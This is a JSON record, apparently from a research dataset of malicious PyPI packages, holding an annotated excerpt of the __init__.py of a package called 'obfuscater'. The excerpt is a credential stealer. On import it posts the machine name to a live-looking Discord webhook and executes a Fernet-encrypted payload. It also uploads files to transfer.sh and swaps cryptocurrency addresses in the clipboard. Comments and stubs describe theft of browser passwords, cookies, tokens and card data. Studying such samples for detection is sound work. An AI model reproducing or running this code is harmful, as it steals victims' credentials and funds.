[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/obfuscater-1.0.0/obfuscater-1.0.0/obfuscater/__init__.py",
    "malicious_code": "import os\nimport requests\nimport httpx\nimport subprocess\nimport threading\nimport shutil\nimport sqlite3\nimport base64\nimport json\nimport re\nimport ntpath\nimport psutil\nimport zipfile\nimport pyperclip\nimport ctypes\nimport time\nfrom fernet import Fernet\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n# Install dependencies (suspicious, but not strictly malicious)\nos.system(\"pip install requests httpx\")\nos.system(\"pip install fernet httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32\")\n\n# Initial exfiltration on run\ndata = {\n        'embeds': [{\n            \"title\": \"Someone Tried to download\",\n            \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n            }]\n    }\nhttpx.post(\"https://discord.com/api/webhooks/1101410365314711592/HXej5uy7xgX3vMmBGojOCRRktxauEWAdSwh2DPAym2Yf0QK7ECmiWihBifWttkm8AYaI\", json=data)\n\n# Decrypt and execute encrypted payload\nexec(Fernet(b'R4OevoWKnw7TjxB4h8HRXKmucWgS3a44xcdsYJj_PTM=').decrypt(b'gAAAAABkUoN0pk4BPGTEhiLmp23RTa32rFz1v2c18V5TLb4ytE9bI4ItsUt-XBoIJ3X_JMkh1rqe87xlMO38YdSarbGGbNQsuEqr2n-CWEandyE3Nb10hFjYFSV-wd0HibgLHbKGXLknkLe3j9Km3QelgJtNvpaJCh_J0-Hm3CFZdaoZm7PPqWoM_7SxUgsqzSwdPGJ86tZpojLTQK32Zk8fSqx-azINnQFhncqTCeWJn1G_C7oSH6PGx7sHTibzQql05Ec-dvipco098Tr70mo8US4WdC-hrb5vQcJkYW1P6Ga7ZmNvt4oRLHxegddNOgPBECBFNfmJGskqIwl3GWYPyDA0vO_lVaPEAZ8I_lQwTgFwms8QCCn1z6290A6Y3pNgoc2RWJUW2Ghgxz8zCXcE84nUGviJHb_93Rn3FZBi_wEGPzUvpyZcBAn9N3_-q3EUEp5m8TYT6NVwSf-aUUsOqVMaBd82o5f9-r_BlncHSPHPM4bhh8piSsQz2iGjjyAFCAneSeaLfhUpHbSTIlnJfomq6Be0W4J0t35GArIDjNMgZb21qt_nTG2Jvaxgg5wgK4GI2nLQls8j0nPDE6n9hY03OvuGma40o6wKMky9phKRW_IysNI7abojNpOeRbDXuLmTUbG_kIvv2VDDy9YCMeAfC9XkebpCTvpcq8pVaBI0HZIJ524IpvwbfWEXISaprBePbLjIEZh2UOosHymIKajmKCx3SVsWPikpDalpIUxu3Z1BybmP-F08b52uBtQvcw6P82x7Z9Evipbd3MACJpQ8I0zoR-cEDMsLJJqOSWmH1EejhmTSUvUpqT_odtWFxpEoAUbPBpWfzUkBGAbFFMD1A3_EGYM_hTm-k3lmRApOY-19RJbBDj7YfJ8ZdGTdjRUjS2jmxXE-xd4XzUsBVdqGvXBsPwGIEHSq_qw0SqsVuzK5YKliumzAoe6yrOSHyrtZWnmBWcWIA-OEJiNyBAQccpBYTCj1tSY46vBcIE2NctENIBBFmlxMmu0y5vjBOSW9NTqB-BVZe1KaFAymv1SFuGX3BsnywRFHthokPGE39TqTHTCG4ytOid9oGSqokpDUDlCXTGiBtAFETE3jf5Kg8ltuHNg4l7_WpUnCLYpCX_sy3RddGoqIhCsEVNQ1PMrRFDNWrpvz9i8s5Lfj-jhrtKL8bhOlQeMEQTfQw1WG2s7EXNXGNm6b4HSG7EvbIJVTwtdNtz0p_i5u_PLKjvuoSAnn541zw7Uko5QjokKMKqBjrKJ1iOqHqAa6OxPq_VMm0TdRlWBN9Dmg13UG0vZ0E3aIHCVLHJEhZ7Jjk77GAci3513Tg4j9MwEiM-TfWl5OYBedbIvPhz1JMiYzv5Fed0hfQLSsfox2C-6jy_CEkuVBf0VtKTdn2N2jcZUzeY9EW4dbm4rIgfqyShz3c_lR5nRgTQy2wjb6NoSb6qtoTLN8Kpwt6PreSH9CbiDJVfU-5Gc1vgB6wrnAX02pW41JILRSJd2SlIBPgw__cTu--BgGbRvF34d5zCVb_E0Jhb1ASz_Tm9lWNUPdQNmgTW_4ZK3RAeCY_hucNMJM8eVNdkEoW0QOhdog6c3eowRclH4x9QKUzVFANFQL4DyvGU8u159xjOGK0Bg_7IjL-pZ1Ds-jZoXfMHaol_1fANEh8f1cjU0g-qKaGtBix9uBut8kz5ZPGAhygrXwwkWyJqsOBPgizT2SmCwyAx6OJoSyc3dhRCc-VTLL8bD9B4PIhE7yKfLPbFICfgyW_S4FSCkGBoxlh9XernGx12YrrGLpX7b9k2wO9sWy0UBZCOSRNlWHFYgbCLOyRpO1SIP267UN8CsA5mb43C41Neu5UcIFaijQsEIwGJJG6jv33yUEqY0kfqQwYAeRATAVlqTuezZPtCcLS7b7HdaEufuxEq1tpdLW4QwRrvCMNNib7Wa2eqmnzjuHxHiuN5lcPCAqufPaMLVor29welTmMI0HiVlgLJh62Ozx85jrFEZ0xrHSBj6MtnJ1J_DKcxly0ipePYAH6T8tKdSKZsCZydkQftckNENPgXLLkj8IuNCXGfGdd_RTmiHij9QxRGtQpsBtfO5k0bwE9vbj0WRxi3aS0VyRBwj7ChrQieBqLknXbdyqxwluAhkCtw4VSWt2J-MZ_OA6R44tLs_YjkAvNnZ36dvfWoqcF-bIeV-UGl5INA7mtzsAt-2ZwFo4J6XMLAi7CldCzraiAUcXt90vbtMUZSByDF7HE-RtOKbYrl-rB7z20i2J4u7tFJsF80xuQ5mlWhcEEGtXBLHMc9uZ3SIxgMjBQJYnS7a1Jr4AbtGJaiiTLF88EUkcsWQwhtwfRmqkq172Qrcbkt2JBz7F8f46co1Sk4Gz7Up43JAGIPo6gbnavd26-nBqr0pDw4Zutkx9iFovZb2Obh7DJdmDBAf-6BEGfHw9NVCUtK8gnroiwrADrIAgjqFYkVRItomw54diaDJ6iNfSMh_vhOjhCU5cYq9tOEHyQTbuK6rgWacT67QE-vWEI95bUVz41JlYEIE8BkFFeCPYx92zcLzLgZEpufxV1fnb-YZfXKhNkvpT8ly_33kwYb_o6exN-qfRVNc_6vcF78iMbb346U1-yOCW2iXVLAIzcZZBEaD6A5YCkYcnfESiaz2-0oDs_fqi29ZnZ7aSS4Ufd5U=').decode(\"utf-8\"))\n\n# --- Malicious classes and functions ---\n# (All code below is malicious, as it steals credentials, cookies, tokens, files, clipboard, and exfiltrates to attacker)\n\n# ...\n# (The rest of the code is as in the original, including all classes: Functions, auto_copy_wallet, bc_initial_func, NoDebugg, and all the functions at the bottom)\n# ...\n# For brevity, only the most critical malicious behaviors are highlighted below, but in a real report, the entire code from the provided file would be included, as all is malicious.)\n\n# --- Clipboard Crypto Address Swapper ---\nclass auto_copy_wallet(Functions):\n    def __init__(self):\n        self.address_st3aler = self.fetch_conf(\"addresse_crypto_replacer\")\n        self.address_btc = self.fetch_conf(\"addresse_btc\")\n        self.address_eth = self.fetch_conf(\"addresse_eth\")\n        self.address_xchain = self.fetch_conf(\"addresse_xchain\")\n        self.address_pchain = self.fetch_conf(\"addresse_pchain\")\n        self.address_cchain = self.fetch_conf(\"addresse_cchain\")\n        self.address_monero = self.fetch_conf(\"addresse_monero\")\n        self.address_ada = self.fetch_conf(\"addresse_ada\")\n        self.address_dash = self.fetch_conf(\"addresse_dash\")\n\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            # ... (other crypto address regexes)\n        except:\n            data = None\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# --- Main Stealer Class ---\nclass bc_initial_func(Functions):\n    # ...\n    # (All methods that steal browser passwords, cookies, tokens, files, screenshots, system info, and exfiltrate to Discord webhook)\n    # ...\n    async def init(self):\n        # ...\n        self.error_remote()\n        self.startupkekw()\n        # ...\n        function_list = [self.steal_screen, self.system_informations, self.steal_token, self.grabb_mc, self.grabb_roblox]\n        # ...\n        for func in function_list:\n            process = threading.Thread(target=func, daemon=True)\n            process.start()\n        for t in threading.enumerate():\n            try:\n                t.join()\n            except RuntimeError:\n                continue\n        self.natify_matched_tokens()\n        self.ping_on_running()\n        self.finished_bc()\n    # ...\n    def steal_token(self):\n        # ...\n        # (Steals Discord tokens from browsers and exfiltrates)\n        # ...\n    def steal_passwords2(self, name: str, path: str, profile: str):\n        # ...\n        # (Steals passwords from Chromium browsers)\n        # ...\n    def steal_cookies2(self, name: str, path: str, profile: str):\n        # ...\n        # (Steals cookies from Chromium browsers)\n        # ...\n    def steal_passwords(self):\n        # ...\n        # (Steals Chrome passwords)\n        # ...\n    def steal_cookies(self):\n        # ...\n        # (Steals Chrome cookies)\n        # ...\n    def steal_history2(self, name: str, path: str, profile: str):\n        # ...\n        # (Steals browser history)\n        # ...\n    def steal_cc2(self, name: str, path: str, profile: str):\n        # ...\n        # (Steals credit card info)\n        # ...\n    def steal_history(self):\n        # ...\n        # (Steals Chrome history)\n        # ...\n    def natify_matched_tokens(self):\n        # ...\n        # (Exfiltrates Discord tokens and user info)\n        # ...\n    def grabb_mc(self):\n        # ...\n        # (Steals Minecraft files)\n        # ...\n    def grabb_roblox(self):\n        # ...\n        # (Steals Roblox cookies)\n        # ...\n    def steal_screen(self):\n        # ...\n        # (Takes screenshot)\n        # ...\n    def system_informations(self):\n        # ...\n        # (Steals system info)\n        # ...\n    def finished_bc(self):\n        # ...\n        # (Zips and exfiltrates all stolen data to Discord webhook)\n        # ...\n\n# --- File/Folder Search and Exfiltration ---\ndef bc_uploadanonfiles(path):\n    try:\n        files = { \"file\": (path, open(path, mode='rb')) }\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\ndef bc_Folder_create(pathF, keywords):\n    # ...\n    # (Uploads files from folders to transfer.sh and tracks them)\n    # ...\n\ndef bc_create_file(path, keywords):\n    # ...\n    # (Searches for files with sensitive keywords and uploads them)\n    # ...\n\ndef bc_checking():\n    # ...\n    # (Searches Desktop, Downloads, Documents for sensitive files and uploads them)\n    # ...\n\n# --- Main Execution ---\nif __name__ == \"__main__\" and os.name == \"nt\":\n    asyncio.run(bc_initial_func().init())\n\n# --- Additional Stealing/Exfiltration Functions ---\ndef getPassw(path, arg):\n    # ...\n    # (Steals passwords from browser databases and exfiltrates)\n    # ...\ndef getCookie(path, arg):\n    # ...\n    # (Steals cookies from browser databases and exfiltrates)\n    # ...\ndef grabb_GatherAll():\n    # ...\n    # (Orchestrates stealing passwords, cookies, and zipping wallet/Steam data for exfiltration)\n    # ...\n\nglobal keyword, cookiWords, paswWords\nkeyword = [ ... ]\ncookiWords = []\npaswWords = []\n\ngrabb_GatherAll()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = bc_checking()\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n    filetext = \"```diff\\n\"\n    for arg in bc_create_files:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext +=f\"\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a)-1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n\"\n    filetext += \"\\n```\"\n    upload(\"bc_checking\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n"
  }
]